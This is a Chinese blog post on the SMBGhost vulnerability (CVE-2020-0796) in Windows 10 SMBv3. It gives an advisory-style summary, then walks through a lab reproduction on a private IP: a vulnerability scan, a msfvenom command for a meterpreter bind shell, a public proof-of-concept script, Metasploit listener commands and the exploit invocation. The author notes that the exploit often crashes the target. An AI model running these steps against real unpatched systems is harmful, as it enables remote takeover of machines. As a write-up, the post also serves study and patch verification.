# CVE-2020-0796 (SMBv3 远程代码执行) Windows-10 - 404p3rs0n - 博客园

> 原文：[`www.cnblogs.com/404p3rs0n/p/15408249.html`](https://www.cnblogs.com/404p3rs0n/p/15408249.html)

## CVE-2020-0796-简介

### 【漏洞名称】

SMB 远程代码执行漏洞（CVE-2020-0796），有安全研究者取名“SMBGhost”。

### 【漏洞类型】

远程代码执行

### 【漏洞等级】

高危

### 【漏洞描述】

微软 3 月 11 日发布 3 月例行更新，其中并未公布编号为 CVE-2020-0796 的高危漏洞资料，但该漏洞却最为引人注目。次日晚（2020 年 3 月 12 日）微软正式发布 CVE-2020-0796 高危漏洞补丁。

SMB 3.1.1 协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。

攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。

该漏洞的后果十分接近永恒之蓝系列，都利用 Windows SMB 漏洞远程攻击获取系统最高权限，WannaCry 勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。除了直接攻击 SMB 服务端造成 RCE 外，该漏洞得亮点在于对 SMB 客户端的攻击，攻击者可以构造特定的网页，压缩包，共享目录，OFFICE 文档等多种方式触发漏洞进行攻击。

该漏洞并未出现在微软 3 月的例行更新列表，有国外安全厂商意外发布了有关该漏洞存在的消息，随后引发行业关注。

### 【漏洞版本】

```
漏洞不影响 win7，漏洞影响 Windows 10 1903 之后的各个 32 位、64 位版 Windows，包括家用版、专业版、企业版、教育版。
Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for x64-based Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows Server, Version 1903 (Server Core installation)
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows Server, Version 1909 (Server Core installation) 
```

### 漏洞复现

RCE 到 Metasploit

使用迅雷下载 win-10 的 iso 镜像并安装系统：

```
Win 10-1903 迅雷下载 ：ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D| 
```

首先查了一下补丁情况，发现没有 ：KB4551762

![](img/331e42798dab7018551d4518fd51a563.png)

通过齐安信的漏洞检测脚本发现存在漏洞：

```
http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip

C:\Users\CVE-2020-0796\Desktop\CVE-2020-0796-Scanner>CVE-2020-0796-Scanner.exe
请输入目标 IP 或 IP 范围:
192.168.146.156
本漏洞扫描工具仅限于网络安全管理员发现本组织的问题系统使用，依据网络安全法，任何攻击为目的对非授权系统的非法使用所导致的后果自负。
[+] 目标 [192.168.146.156] 已支持 SMB v3.1.1
[-] 警告！目标 [192.168.146.156] 仍存在漏洞风险 
```

![](img/d6701a36e8a5822c7a9a25071681074e.png)

通过 MSF 生成 shellcode：（用正向）

```
msfvenom -p windows/x64/meterpreter/bind_tcp lport=9999 -f py -o shellcode.txt 
```

![](img/3ef08ca04851904fd9d4dab110068d3c.png)

![](img/25d02f96eff726c701c1e610ebf8a315.png)

然后我们通过下载 exp 脚本：

```
https://github.com/chompie1337/SMBGhost_RCE_PoC.git 
```

把刚刚 MSF 生成的 shellcode 里的 buf 替换成 USER_PAYLOAD：

![](img/7325fc113af1884e34a3f1d07ba2cfd4.png)

这个时候 MSF 就可以启动监听了：

```
msfconsole
use exploit/multi/handler 
set payload windows/x64/meterpreter/bind_tcpset 
lport 9999set rhost 192.168.146.156
exploit 
```

![](img/8843af5750a51526a49a9a8f5eb5eb16.png)

![](img/f1a8f03873c665057934da7f978b21a0.png)

然后运行 Python 脚本反弹会话：

```
python3 exploit.py -ip 192.168.146.156 
```

![](img/df5639b29c02aaf90db94a4b04f85bb3.png)

有效显示：

![](img/96851616700b8bb85757b0f2c13cc90c.png)

![](img/4f945e5153a25e5e63f354a4c10bcbd0.png)

注意!!!

有很大的几率会导致目标系统蓝屏！
![](img/8de1f1c2cabba43357460845872d3009.png)

emo，小编成功蓝屏 2333